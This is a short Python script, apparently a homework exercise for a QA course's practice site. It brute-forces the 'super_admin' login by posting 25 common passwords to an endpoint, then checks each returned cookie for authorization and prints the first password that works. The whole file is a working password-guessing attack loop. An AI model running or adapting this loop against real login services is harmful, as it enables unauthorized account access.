import requests

passwords = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou",
             "111111", "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321",
             "555555", "lovely", "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe"]
login = "super_admin"

for password in passwords:
    payload = {"login": login, "password": password}
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
    cookie = response.cookies
    response_auth = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookie)
    if response_auth.text != "You are NOT authorized":
        print(f"password: {password}")
        print(response_auth.text)
        break
